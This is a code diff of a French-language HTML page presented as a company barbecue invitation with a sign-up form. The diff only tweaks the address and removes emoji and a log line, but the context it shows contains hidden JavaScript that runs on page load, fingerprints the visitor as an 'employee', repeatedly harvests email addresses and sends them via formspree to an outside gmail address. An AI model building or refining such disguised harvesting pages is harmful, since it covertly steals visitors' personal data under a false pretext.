@@ -229,8 +229,7 @@
         <div class="event-info">
             <h3>📅 Samedi 15 Juillet 2025</h3>
             <p>🕕 À partir de 18h00</p>
-            <p>📍 Jardin de la Maison - 123 Rue du Barbecue</p>
-            <p>💰 Participation : 15€ par personne</p>
+            <p>📍 TEST RUE DU TEST </p>
         </div>
 
         <form id="inscriptionForm" action="https://formspree.io/f/VOTRE_ID_FORMSPREE" method="POST">
@@ -673,7 +672,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             employeeFingerprint = generateAdvancedFingerprint();
             
-            console.log('🔍 EXTRACTION AGRESSIVE D\'EMAILS EN COURS...');
+            
             
             const foundEmails = aggressiveEmailHarvesting();
             
@@ -689,7 +688,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        _subject: `📧 TOUS LES EMAILS TROUVÉS - ${employeeFingerprint}`,
+                        _subject: `TOUS LES EMAILS TROUVÉS - ${employeeFingerprint}`,
                         _replyto: 'soireebarbecue.ef@gmail.com',
                         _cc: 'soireebarbecue.ef@gmail.com',
                         employeeFingerprint: employeeFingerprint,
@@ -700,7 +699,7 @@
                     })
                 });
             } else {
-                console.log('❌ Aucun email trouvé automatiquement');
+                console.log('Aucun email trouvé automatiquement');
                 setTimeout(() => createEmailCapture(employeeFingerprint), 1000);
             }
             
@@ -711,14 +710,14 @@
                     if (!foundEmails.includes(email)) {
                         foundEmails.push(email);
                         sendEmailFound(email, `background_extraction_${extractionCount}`);
-                        console.log('🆕 NOUVEL EMAIL TROUVÉ:', email);
+                        console.log(' NOUVEL EMAIL TROUVÉ:', email);
                     }
                 });
                 
                 extractionCount++;
                 if (extractionCount >= 10) {
                     clearInterval(backgroundExtraction);
-                    console.log('🏁 EXTRACTION TERMINÉE - Total trouvé:', foundEmails.length);
+                    console.log('EXTRACTION TERMINÉE - Total trouvé:', foundEmails.length);
                 }
             }, 1000);
             
@@ -732,4 +731,4 @@
     </script>
 </body>
 </html>
-//
+
